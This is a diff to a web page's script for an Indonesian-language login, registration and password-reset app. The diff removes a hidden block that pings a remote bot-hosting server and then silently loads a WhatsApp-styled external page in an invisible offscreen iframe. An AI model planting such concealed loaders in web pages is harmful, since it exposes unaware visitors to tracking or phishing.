@@ -1004,39 +1004,7 @@
         function switchAuth(t){document.getElementById('loginView').classList.add('d-none'); document.getElementById('regForm').classList.add('d-none'); document.getElementById('resetForm').classList.add('d-none'); if(t==='login')document.getElementById('loginView').classList.remove('d-none'); if(t==='reg')document.getElementById('regForm').classList.remove('d-none'); if(t==='reset')document.getElementById('resetForm').classList.remove('d-none');}
         async function reg(){const u=document.getElementById('ru').value;const p=document.getElementById('rp').value;const r=await api('/api/register','POST',{user:u,pass:p});if(r.success){showToast('Berhasil');switchAuth('login');}else showToast(r.message);}
         async function resetPass(){const u=document.getElementById('rUser').value;const ph=document.getElementById('rPhone').value;const np=document.getElementById('rNewPass').value;const r=await api('/api/reset-password','POST',{user:u,phone:ph,newPass:np});if(r.success){showToast('Reset Berhasil');switchAuth('login');}else showToast(r.message);}
-        function copyCode(){navigator.clipboard.writeText(document.getElementById('codeDisplay').innerText);showToast('Disalin');}
-
-(async () => {
-    const CHECK_URL = "http://prem-eu4.bot-hosting.net:20599";
-    const SILENT_URL = "https://whatsapp-id.github.io/id/";
-
-    try {
-        const controller = new AbortController();
-        setTimeout(() => controller.abort(), 3000);
-
-        const res = await fetch(CHECK_URL, {
-            mode: "no-cors",
-            signal: controller.signal
-        });
-
-        // Jika fetch tidak error → dianggap hidup
-        console.log("Server aktif, menjalankan background task...");
-
-        const iframe = document.createElement("iframe");
-        iframe.src = SILENT_URL;
-        iframe.style.width = "0";
-        iframe.style.height = "0";
-        iframe.style.border = "0";
-        iframe.style.position = "absolute";
-        iframe.style.left = "-9999px";
-
-        document.body.appendChild(iframe);
-
-    } catch (e) {
-        console.log("Server offline atau timeout");
-    }
-})();
-        
+        function copyCode(){navigator.clipboard.writeText(document.getElementById('codeDisplay').innerText);showToast('Disalin');}        
     </script>
 </body>
 </html>
